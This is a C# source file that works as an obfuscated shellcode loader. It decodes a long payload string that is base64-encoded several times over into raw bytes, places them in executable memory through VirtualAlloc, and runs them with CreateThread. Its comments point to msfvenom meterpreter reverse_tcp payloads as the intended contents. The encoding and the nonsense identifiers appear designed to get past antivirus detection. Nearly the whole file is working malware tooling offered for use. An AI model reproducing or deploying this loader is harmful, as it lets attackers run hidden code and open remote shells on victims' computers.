using System;
using Ihonestlycouldntthinkofabetteralias = System.Runtime.InteropServices;
using System.Collections.Generic;

namespace koby
{
    class Program
    {
        public class Jaskier
        {
            private static string kernel32 = "kernel32";
            private static string thisisthethingthatisgonnagivemecontrol = "VkZWb2IyRXhiRlJrTTJSc1VqQXdlVlJGVWtOT1JuQkZZVE5PVGxOSFkzcFVhMDR6WkRKV1JWTlVRazFTUlVrd1YyMXdVbU13TVVsaFIyeGFWVE5rTTFwVlVrNU9WWGhGVVdwU1RsWkZNWHBVVldodllXczVWR1F6Wkd4U1JVVXdWRVZTUTA1Rk5WaFRXRTVPVTBka05WUXhUak5rTWxaSVZGUldUVkpGU1RCWFYzQkdZekF4U1ZvemNFNVZNMlF6V2xWU1RtVkZlRVZSYWxKUFZrVXhlbFJWYUc1bFJUbEVaRE5rYkZKRlJqWlVSVkpEVGtVMVZWUllUazVUUjJRMFZEQk9NMlF5VmtWYU0zQk5Va1ZKTUZkWWNFNWpNREZKV2pOd1lWRXpaRE5hVldSYVpVVjRSVkZxVWs1TmF6RjZWRlZvYjJKVk5VUmtNMlJzVWpGRmVGUkZVa05PUlRVMldUTk9UbE5IYUhCWGJFNHpaREpXUlZGVVJrMVNSVWt3VkZkd1ZtTXdNVWxhTTJoUVVUTmtNMXBWVWs1TmEzaEZVV3BTWVZaRlJucFVWV2h1WlVVMVJHUXpaR3hTUlZVd1ZFVlNRMDVGTVhSVVdFNU9VMGRqZVZSVlRqTmtNbFpGVVZSS1RWSkZTVEJYVmxKdVl6QXhTVm96YkU5aFdHUXpXbFZTU2sxRmVFVlJhbEphVmpCV2VsUlZhRzVOUlRFMVpETmtiRkpHY0c5VVJWSkRUa1p3U0ZWWVRrNVRSMlEyVkRGT00yUXlWa1ZUV0doTlVrVkpNRmRXVWs1ak1ERkpZVWQwVG1GWVpETmFWVkp2WVVWNFJWRnFVbEJTTURGNlZGVm9iazVWTlZSa00yUnNVakZLY2xSRlVrTk9SVEZJVTFoT1RsTkhhSEJYV0d3elpESldTRlpVU2sxU1JVa3dWR3BLVG1Nd01VbGFlbEpoWVZoa00xcFZaRXRpVlhoRlVXcFNUazFyVm5wVVZXaHVUVlp3Y0dRelpHeFNNRnB6VkVWU1EwNUZNVWhYV0U1T1UwZGpkMWR0YkROa01sWkZZa2Q0VFZKRlNUQlhiWEJxWXpBeFNWcDZUazVoV0dReldsVmtSbVZWZUVWUmFsSmhZV3RzZWxSVmFHOWhSVEZFWkROa2JGSXhhekZVUlZKRFRrVXhWVkpZVGs1VFIyaHpWRmhzTTJReVZraFVWRVpOVWtWSk1GZFhjRkpqTURGSllVZG9VRlV6WkROYVZWSnVUa1Y0UlZGcVVsQldSbFo2VkZWb2JrMVZPVlJrTTJSc1VqQmFiMVJGVWtOT1JUVjBWVmhPVGxOSFkzbFhhMDR6WkRKV1JWWnRiRTFTUlVrd1ZERmtTbU13TVVsYU0yeE9aVmhrTTFwVlpGWk5hM2hGVVdwU1RsSkZiSHBVVldodVpXeHNjR1F6Wkd4U01EQjRWRVZTUTA1Rk1YUlRXRTVPVTBka05sZHRiRE5rTWxaRldUTnNUVkpGU1RCWGEyUlNZekF4U1ZvemJGQlJNMlF6V2xWU2EyRkZlRVZSYWxKYVRXc3hlbFJWYUc1TlZUVndaRE5rYkZKSGVHOVVSVkpEVGtad2NWRllUazVUUjJoeFYyMXNNMlF5VmtoVGJYaE5Va1ZKTUZkclVrNWpNREZKWVVjeFVGVXpaRE5hVlZKcllXdDRSVkZxVW1GaVZteDZWRlZvYjJFeGJEVmtNMlJzVWtWS2NGUkZVa05PUlRSNVZGaE9UbE5IYUhGVWJtd3paREpXU0ZWdGFFMVNSVWt3VjIxd1RtTXdNVWxhTTJSYVlWaGtNMXBWVWs1bFJYaEZVV3BTVGxaSGRIcFVWV2h1VGtVNVZHUXpaR3hTUlVwd1ZFVlNRMDVGT1VWWFdFNU9VMGRqZVZSVlRqTmtNbFpGVmxSR1RWSkZTVEJVTVZKeVl6QXhTVm96YUdGUk0yUXpXbFZrVG1WVmVFVlJhbEpPVmpGV2VsUlZhRzVsYXpsVVpETmtiRkl4Y0c5VVJWSkRUa1p3Y1ZSWVRrNVRSMmgwVkZoc00yUXlWa2hWYlhCTlVrVkpNRlF3VW5Kak1ERkpZVWN4WVdGWVpETmFWV1JLVGtWNFJWRnFVbHBXTUd4NlZGVm9iMkV3TlhCa00yUnNVakZXTmxSRlVrTk9SVEI1VjFoT1RsTkhZM3BYYld3elpESldSVmR0ZEUxU1JVa3dWRlprV21Nd01VbGhSM0JhWVZoa00xcFZVbXRpUlhoRlVXcFNXbFpGYkhwVVZXaHVUbFUxY0dRelpHeFNSMmgwVkVWU1EwNUdiRlZWV0U1T1UwZGplVlJ0YkROa01sWklWMWh3VFZKRlNUQlViRkpTWXpBeFNXRkhjRTlSTTJReldsVlNUMkpWZUVWUmFsSlBWa2QwZWxSVmFHNWxiR3hVWkROa2JGSXhhekZVUlZKRFRrVXhjVkZZVGs1VFIyUXpWRmRzTTJReVZraFdXSEJOVWtWSk1GUnNaRnBqTURGSldqTnNXbFV6WkROYVZXUkhZa1Y0UlZGcVVtRmhhMFo2VkZWb2IySkdjRVJrTTJSc1VrZE9ORlJGVWtOT1JteFZWVmhPVGxOSFpETlVibXd6WkRKV1JWZFljRTFTUlVrd1ZGVmtUbU13TVVsYWVsSmFWVE5rTTFwVlVrSk9SWGhGVVdwU1QwMXJiSHBVVldodVpERndjR1F6Wkd4U01IQnZWRVZTUTA1Rk5YRlJXRTVPVTBkamQxZFdUak5rTWxaRlducENUVkpGU1RCVWJGSldZekF4U1dGSE1VOWhXR1F6V2xWU1ZtVnJlRVZSYWxKUFVqRnNlbFJWYUc1bFJURndaRE5rYkZKRlJUQlVSVkpEVGtVeFdGWllUazVUUjJoeVZGZHNNMlF5VmtWVVdHeE5Va1ZKTUZRd1VrWmpNREZKWVVkd1QyVllaRE5hVlZKdVRXdDRSVkZxVWs1U1IwNTZWRlZvYjJGc2JEVmtNMlJzVWpGcmVsUkZVa05PUlRSNVZGaE9UbE5IWTNkWFYyd3paREpXU0ZaVVZrMVNSVWt3VkdwS1NtTXdNVWxhZWs1UFZUTmtNMXBWVWs1bGEzaEZVV3BTVGxJeFZucFVWV2h1VFdzeE5XUXpaR3hTTVhCeFZFVlNRMDVGTVRaWFdFNU9VMGRqZDFkV1RqTmtNbFpGVTFod1RWSkZTVEJYYkdST1l6QXhTVnA2UWxwVk0yUXpXbFZrVG1WcmVFVlJhbEphWld4c2VsUlZhRzVsUlRGd1pETmtiRkl4YXpGVVJWSkRUa1p3VlZWWVRrNVRSMmh4VkZkc00yUXlWa1ZaTTJSTlVrVkpNRlF4WkU1ak1ERkpXbnBPVDJGWVpETmFWVkp2WWtWNFJWRnFVazlXUjJSNlZGVm9ibVZzYkhCa00yUnNVakZ3ZEZSRlVrTk9SVEUyVmxoT1RsTkhhRzlVYkVVNVVGRTlQUT09";
            private static List<byte> shogun = new List<byte>() { 0x00 };
            
            // Set the memory to commit and rx 
            private static UInt32 MEM_COMMIT = 0x1000;
            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            // create VirtualAlloc(), CreateThread() and WaitForSingleObject() references through DLLImport of 'kernel32' package
            [Ihonestlycouldntthinkofabetteralias.DllImport(nameof(kernel32))]
            private static extern UInt32 VirtualAlloc(UInt32 lump,
                    UInt32 lard, UInt32 fiction, UInt32 magic);
            [Ihonestlycouldntthinkofabetteralias.DllImport(nameof(kernel32))]
            private static extern IntPtr CreateThread(
                UInt32 cucumber,
                UInt32 october,
                UInt32 nevergonnagiveyouup,
                IntPtr gotcha,
                UInt32 weeb,
                ref UInt32 toaster
                );
            [Ihonestlycouldntthinkofabetteralias.DllImport(nameof(kernel32))]
            private static extern UInt32 WaitForSingleObject(
                IntPtr kansas,
                UInt32 nectar
                );
            // everything in Main() will fire code at launch
            public static void Main(string[] args)
            {
                // Can't use bass64 to get command
                // - Make it so you get command
                cantremembermydreams();

                // create and set the shellcode byte[] and feed it byte[] of shellcode or other payloads: Generated via msfvenom
                // Ex: msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=1337 -f csharp 
                byte[] buzzLightyear = shogun.ToArray();
                // Allocate the virtual memory and copy in shell code, address and length
                UInt32 funkydunky;
                funkydunky = VirtualAlloc(0, (UInt32)buzzLightyear.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Ihonestlycouldntthinkofabetteralias.Marshal.Copy(buzzLightyear, 0, (IntPtr)funkydunky, buzzLightyear.Length);
                // set the pointer of thread
                IntPtr giveThread = IntPtr.Zero;
                // hold thread's id
                UInt32 poptart = 0;
                // store process info point
                IntPtr cannabanna = IntPtr.Zero;
                // Create the thread - Passing in TheadAttributes, Stack Size, Address, process info, creation flags and thread Id
                giveThread = CreateThread(0, 0, funkydunky, cannabanna, 0, ref poptart);
                WaitForSingleObject(giveThread, 0xFFFFFFFF);
            }

            private static void cantremembermydreams()
            {
                string[] goku = thisisthethingthatisgonnagivemecontrol.Split(',');
                string vegeta;
                do
                {
                    vegeta = tellmomimsorry(goku[0]);
                    goku = vegeta.Split(',');
                } while (goku.Length == 1);

                shogun.Clear();
                foreach (string gohan in goku)
                {
                    shogun.Add(Convert.ToByte(gohan, 16));
                }   
            }

            private static string tellmomimsorry(string janetjackson)
            {
                var donttelldadthough = System.Convert.FromBase64String(janetjackson);
                return System.Text.Encoding.UTF8.GetString(donttelldadthough);
            }
        }
    }
}